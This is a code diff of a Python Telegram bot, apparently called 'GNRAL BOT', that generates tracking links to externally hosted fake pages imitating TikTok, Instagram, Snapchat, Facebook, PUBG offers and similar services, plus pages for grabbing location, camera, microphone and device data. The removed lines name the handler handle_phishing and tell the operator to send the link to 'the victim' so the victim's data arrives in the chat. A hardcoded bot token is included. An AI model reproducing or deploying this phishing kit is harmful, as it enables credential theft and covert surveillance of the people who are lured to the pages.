@@ -1,30 +1,24 @@
-import os, sys, subprocess, logging, time, threading, requests
+import os, sys, subprocess, logging, time, threading
 
-# ========== تثبيت تلقائي للمكتبات ==========
-def ensure_module(package, import_name=None):
-    name = import_name or package
+# تثبيت المكتبات الناقصة تلقائياً قبل أي استيراد
+for lib in ["flask", "requests", "pyTelegramBotAPI"]:
     try:
-        __import__(name)
+        __import__(lib.replace("pyTelegramBotAPI", "telebot"))
     except ImportError:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
+        subprocess.check_call([sys.executable, "-m", "pip", "install", lib, "--quiet"])
 
-ensure_module("flask")
-ensure_module("requests")
-ensure_module("pyTelegramBotAPI", "telebot")
-
+import requests
 from flask import Flask, request
 from telebot import TeleBot, types
 
 # ========== الإعدادات ==========
 TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
-BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
-APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيق البوت
+BASE_URL = "https://fgnral-html-5waj.onrender.com"
+APP_URL = "https://gamee-beqx.onrender.com"
 
-logging.basicConfig(level=logging.INFO)
 bot = TeleBot(TOKEN, threaded=False)
 app = Flask(__name__)
 
-# ========== الصفحات (17 زر بالضبط) ==========
 PAGES = [
     ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
     ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
@@ -34,124 +28,64 @@ PAGES = [
     ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
     ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
     ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
-    ("📱 فحص مواصفات الجهاز", "device.html")   # الزر الأخير (عريض)
+    ("📱 فحص مواصفات الجهاز", "device.html")
 ]
 
-# ========== مسار health (لاختبار السيرفر ولمنع السكون) ==========
 @app.route("/health")
 def health():
     return "OK", 200
 
-# ========== Webhook ==========
 @app.route(f"/{TOKEN}", methods=['POST'])
 def webhook():
     if request.headers.get('content-type') == 'application/json':
         try:
-            json_string = request.get_data().decode('utf-8')
-            update = types.Update.de_json(json_string)
+            update = types.Update.de_json(request.get_data().decode('utf-8'))
             bot.process_new_updates([update])
             return ''
-        except Exception as e:
-            logging.error(f"Webhook error: {e}")
+        except:
             return ''
     return '!', 403
 
-# ========== أمر /start ==========
 @bot.message_handler(commands=['start'])
 def start(msg):
     chat_id = msg.chat.id
     markup = types.InlineKeyboardMarkup(row_width=2)
-
-    # إضافة الأزواج (8 أزواج = 16 زر)
     for i in range(0, len(PAGES) - 1, 2):
-        left = PAGES[i]
-        right = PAGES[i+1]
-        markup.row(
-            types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
-            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
-        )
-
-    # الزر الأخير (فحص الجهاز) بمفرده ليكون عريضًا
+        l, r = PAGES[i], PAGES[i+1]
+        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
+                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
     last = PAGES[-1]
     markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
+    bot.send_message(chat_id, "🔱 <b>GNRAL BOT</b>\n🟢 جاهز - اختر المنصة:", reply_markup=markup, parse_mode="HTML")
 
-    welcome_text = """🔱 <b>GNRAL BOT</b>
-
-🟢 <b>نسبة النجاح:</b> 95%
-🔄 <b>بروكسيات:</b> 9626
-❤️ <b>الحالة:</b> جاهز
-
-اختر المنصة:"""
-
-    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="HTML")
-
-# ========== الضغط على أي صفحة ==========
-@bot.callback_query_handler(func=lambda call: call.data.startswith("ph|"))
-def handle_phishing(call):
+@bot.callback_query_handler(func=lambda c: c.data.startswith("ph|"))
+def send_link(call):
     chat_id = call.message.chat.id
     page = call.data.split("|")[1]
     link = f"{BASE_URL}/{page}?chat={chat_id}"
+    markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
+    bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
 
-    markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
-
-    bot.edit_message_text(
-        f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسل هذا الرابط للضحية. عند إدخال بياناته ستصل إليك هنا.",
-        chat_id,
-        call.message.message_id,
-        parse_mode="HTML",
-        reply_markup=markup
-    )
-    bot.answer_callback_query(call.id)
-
-# ========== زر الرجوع ==========
-@bot.callback_query_handler(func=lambda call: call.data == "back")
-def handle_back(call):
+@bot.callback_query_handler(func=lambda c: c.data == "back")
+def go_back(call):
     chat_id = call.message.chat.id
     markup = types.InlineKeyboardMarkup(row_width=2)
-
     for i in range(0, len(PAGES) - 1, 2):
-        left = PAGES[i]
-        right = PAGES[i+1]
-        markup.row(
-            types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
-            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
-        )
-
+        l, r = PAGES[i], PAGES[i+1]
+        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
+                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
     last = PAGES[-1]
     markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))
+    bot.edit_message_text("🔱 <b>GNRAL BOT</b>\n🟢 جاهز - اختر المنصة:", chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
 
-    welcome_text = """🔱 <b>GNRAL BOT</b>
-
-🟢 <b>نسبة النجاح:</b> 95%
-🔄 <b>بروكسيات:</b> 9626
-❤️ <b>الحالة:</b> جاهز
-
-اختر المنصة:"""
-
-    bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
-    bot.answer_callback_query(call.id)
-
-# ========== وظيفة منع السكون (Keep-Alive) ==========
 def keep_alive():
     while True:
-        time.sleep(120)  # دقيقتين
-        try:
-            requests.get(f"{APP_URL}/health", timeout=5)
-            logging.info("Keep-alive ping sent")
-        except Exception as e:
-            logging.error(f"Keep-alive failed: {e}")
+        time.sleep(120)
+        try: requests.get(f"{APP_URL}/health", timeout=5)
+        except: pass
 
-# ========== تشغيل ==========
 if __name__ == '__main__':
-    # تشغيل keep-alive في خيط منفصل
     threading.Thread(target=keep_alive, daemon=True).start()
-
-    # إعداد webhook
     bot.remove_webhook()
     bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
-    logging.info("✅ Webhook set & bot is running with keep-alive")
-
-    # تشغيل Flask
-    PORT = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=PORT)
+    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
